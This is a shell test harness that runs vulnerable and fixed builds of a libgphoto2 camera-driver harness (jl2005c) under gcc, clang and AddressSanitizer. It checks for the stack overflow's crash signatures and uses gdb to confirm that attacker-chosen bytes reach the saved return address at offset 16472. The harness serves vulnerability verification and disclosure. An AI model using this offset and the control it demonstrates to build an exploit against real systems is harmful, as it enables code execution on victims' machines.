#!/bin/sh
# Deterministic assertions + normalized trace for libgphoto2shell.
# 24 invocations (gcc/clang x vuln/fixed x plain/asan x baseline/attack/heap)
# plus three gdb chosen-byte probes. Trace excludes PID, addresses and paths.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
OUT="$HERE/evidence"
mkdir -p "$OUT"
PASS=0
FAIL=0

expect() { # file expected-substring label
    if grep -qF -- "$2" "$1"; then PASS=$((PASS+1))
    else FAIL=$((FAIL+1)); printf 'FAIL %s: missing %s\n' "$3" "$2"; fi
}
absent() { # file forbidden-substring label
    if grep -qF -- "$2" "$1"; then FAIL=$((FAIL+1)); printf 'FAIL %s: unexpected %s\n' "$3" "$2"
    else PASS=$((PASS+1)); fi
}

run_all() {
    for cc in gcc clang; do
        for v in vuln fixed; do
            for mode in plain asan; do
                for sc in baseline attack heap; do
                    f="$OUT/$mode-$cc-$v-$sc.out"
                    set +e
                    ASAN_OPTIONS=detect_leaks=0 "$HERE/$cc-$v-$mode" "$sc" > "$f" 2>&1
                    rc=$?
                    set -e
                    printf 'EXIT=%d\n' "$rc" >> "$f"
                done
            done
        done
    done
}
run_all

for cc in gcc clang; do
  for v in vuln fixed; do
    for mode in plain asan; do
      for sc in baseline attack heap; do
        f="$OUT/$mode-$cc-$v-$sc.out"; tag="$mode-$cc-$v-$sc"
        if [ "$sc" = baseline ]; then
            expect "$f" 'scenario=baseline' "$tag"
            expect "$f" "variant=$v" "$tag"
            expect "$f" 'rc=0' "$tag"
            expect "$f" 'big_n=1536' "$tag"
            absent "$f" 'AddressSanitizer' "$tag"
        elif [ "$v" = fixed ]; then
            expect "$f" "rc=-3" "$tag"
            expect "$f" 'big_seen=0' "$tag"
            absent "$f" 'AddressSanitizer' "$tag"
        elif [ "$mode" = plain ] && [ "$sc" = heap ]; then
            expect "$f" 'big_n=15904' "$tag"
            expect "$f" 'rc=0' "$tag"
            absent "$f" 'AddressSanitizer' "$tag"
        fi
      done
    done
  done
done

# Vulnerable plain attack: gcc stack protector aborts, clang faults on
# corrupted frame state; both are observed crashes, not simulated markers.
expect "$OUT/plain-gcc-vuln-attack.out" 'stack smashing detected' 'plain-gcc-attack'
expect "$OUT/plain-gcc-vuln-attack.out" 'EXIT=134' 'plain-gcc-attack'
expect "$OUT/plain-clang-vuln-attack.out" 'EXIT=139' 'plain-clang-attack'

# ASan: the oversized device read at pinned :152 writes 16384 bytes into the
# 16416-byte stack buffer. The "heap" variant caps the device reply so the
# first ASan report is the source over-read of the memmove at pinned :154.
for cc in gcc clang; do
    f="$OUT/asan-$cc-vuln-attack.out"
    expect "$f" 'ERROR: AddressSanitizer: stack-buffer-overflow' "asan-$cc-attack"
    expect "$f" 'WRITE of size 16384' "asan-$cc-attack"
    expect "$f" 'jl2005c.c.vuln:152' "asan-$cc-attack"
    expect "$f" 'EXIT=1' "asan-$cc-attack"
    f="$OUT/asan-$cc-vuln-heap.out"
    expect "$f" 'ERROR: AddressSanitizer: stack-buffer-overflow' "asan-$cc-heap"
    expect "$f" 'READ of size 16848' "asan-$cc-heap"
    expect "$f" 'jl2005c.c.vuln:154' "asan-$cc-heap"
    expect "$f" 'EXIT=1' "asan-$cc-heap"
done

# gdb chosen-byte probes, plain builds.
G="$OUT/gdb-chosen.out"
set +e
gdb -q -batch -ex 'set pagination off' -ex 'break jl2005c.c.vuln:155' -ex 'run attack' \
    -ex 'x/8xb info+0x4020' -ex 'x/8xb g_priv->table+0x4000' \
    "$HERE/gcc-vuln-plain" > "$G" 2>&1
set -e
expect "$G" '0x5a	0x5a	0x5a	0x5a	0x5a	0x5a	0x5a	0x5a' 'gdb-chosen'

R="$OUT/gdb-rip.out"
set +e
gdb -q -batch -ex 'set pagination off' -ex 'break jl2005c.c.vuln:154' -ex 'run attack 0x3e58' \
    -ex 'printf "OFFSET=%ld\n", (long)($rbp+8-(char*)&info)' -ex 'x/8xb $rbp+8' \
    "$HERE/clang-vuln-plain" > "$R" 2>&1
set -e
expect "$R" 'OFFSET=16472' 'gdb-rip'
expect "$R" '0x41	0x42	0x43	0x44	0x45	0x46	0x47	0x48' 'gdb-rip'

# Deterministic normalized trace.
TRACE="$OUT/trace.txt"
: > "$TRACE"
for cc in gcc clang; do
  for v in vuln fixed; do
    for mode in plain asan; do
      for sc in baseline attack heap; do
        f="$OUT/$mode-$cc-$v-$sc.out"
        printf '%s ' "$mode-$cc-$v-$sc" >> "$TRACE"
        grep -E '^(scenario=|EXIT=)' "$f" | tr '\n' '|' >> "$TRACE"
        grep -oE '(ERROR: AddressSanitizer: stack-buffer-overflow|WRITE of size [0-9]+|READ of size [0-9]+|jl2005c\.c\.vuln:[0-9]+|stack smashing detected)' "$f" | tr '\n' '|' >> "$TRACE"
        printf '\n' >> "$TRACE"
      done
    done
  done
done
grep -E '^0x[0-9a-f]{8,}:' "$G" | sed -E 's/^0x[0-9a-f]{8,}:[[:space:]]*/STACK: /' | sed -E 's/0x[0-9a-f]{8,}/ADDR/g' >> "$TRACE"
grep -E '^0x[0-9a-f]{8,}:' "$R" | sed -E 's/^0x[0-9a-f]{8,}:[[:space:]]*/RIP: /' | sed -E 's/0x[0-9a-f]{8,}/ADDR/g' >> "$TRACE"
grep -E 'OFFSET=' "$R" >> "$TRACE"
HASH=$(sha256sum "$TRACE" | cut -d' ' -f1)
printf 'PASS=%d FAIL=%d TRACE=%s\n' "$PASS" "$FAIL" "$HASH"
[ "$FAIL" -eq 0 ]
